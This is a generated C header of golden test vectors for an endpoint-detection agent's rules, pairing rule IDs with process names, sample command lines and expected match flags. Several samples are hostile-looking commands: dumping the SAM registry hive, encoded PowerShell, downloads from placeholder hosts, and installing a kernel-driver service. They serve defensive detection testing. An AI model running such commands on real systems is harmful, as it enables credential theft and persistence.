/* 由 edr-agent/scripts/gen_p0_golden_vectors_inc.py 自 p0_golden_vectors.json 生成，勿手改。 */
#ifndef P0_GOLDEN_VECTORS_DATA_INC
#define P0_GOLDEN_VECTORS_DATA_INC
#define P0_GOLDEN_N 11
static const char p0_gv_r0[] = "R-EXEC-001";
static const char p0_gv_p0[] = "powershell.exe";
static const char p0_gv_c0[] = "powershell -EncodedCommand abc";
static const char p0_gv_r1[] = "R-EXEC-001";
static const char p0_gv_p1[] = "cmd.exe";
static const char p0_gv_c1[] = "powershell -EncodedCommand x";
static const char p0_gv_r2[] = "R-CRED-001";
static const char p0_gv_p2[] = "reg.exe";
static const char p0_gv_c2[] = "reg save hklm\\sam C:\\s.reg";
static const char p0_gv_r3[] = "R-FILELESS-001";
static const char p0_gv_p3[] = "pwsh.exe";
static const char p0_gv_c3[] = "pwsh -c \"Invoke-Expression Write-Host 1\"";
static const char p0_gv_r4[] = "R-CRED-001";
static const char p0_gv_p4[] = "reg.exe";
static const char p0_gv_c4[] = "reg query HKLM\\SAM";
static const char p0_gv_r5[] = "R-FILELESS-001";
static const char p0_gv_p5[] = "powershell.exe";
static const char p0_gv_c5[] = "powershell -NoP -Command \"Get-Date\"";
static const char p0_gv_r6[] = "R-EXEC-001";
static const char p0_gv_p6[] = "powershell.exe";
static const char p0_gv_c6[] = "powershell -NoP -File C:\\n.ps1";
static const char p0_gv_r7[] = "R-SILVERFOX-001";
static const char p0_gv_p7[] = "url.exe";
static const char p0_gv_c7[] = "C:\\Users\\Public\\501\\url.exe https://cdn.example.invalid/a.bin -o C:\\ProgramData\\Golden\\Setup64.exe";
static const char p0_gv_r8[] = "R-SILVERFOX-001";
static const char p0_gv_p8[] = "curl.exe";
static const char p0_gv_c8[] = "C:\\Windows\\System32\\curl.exe https://repo.example.invalid/tool.exe";
static const char p0_gv_r9[] = "R-SILVERFOX-002";
static const char p0_gv_p9[] = "Setup64.exe";
static const char p0_gv_c9[] = "C:\\ProgramData\\Golden\\Setup64.exe /silent";
static const char p0_gv_r10[] = "R-SILVERFOX-004";
static const char p0_gv_p10[] = "sc.exe";
static const char p0_gv_c10[] = "sc.exe create wsftprm type= kernel binPath= C:\\Windows\\Temp\\wsftprm.sys";
static const char *p0_golden_rule_id[] = {
p0_gv_r0, p0_gv_r1, p0_gv_r2, p0_gv_r3, p0_gv_r4, p0_gv_r5, p0_gv_r6, p0_gv_r7, p0_gv_r8, p0_gv_r9, p0_gv_r10, };
static const char *p0_golden_process_name[] = {
p0_gv_p0, p0_gv_p1, p0_gv_p2, p0_gv_p3, p0_gv_p4, p0_gv_p5, p0_gv_p6, p0_gv_p7, p0_gv_p8, p0_gv_p9, p0_gv_p10, };
static const char *p0_golden_cmdline[] = {
p0_gv_c0, p0_gv_c1, p0_gv_c2, p0_gv_c3, p0_gv_c4, p0_gv_c5, p0_gv_c6, p0_gv_c7, p0_gv_c8, p0_gv_c9, p0_gv_c10, };
static const int p0_golden_expect[] = {
1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, };
#endif

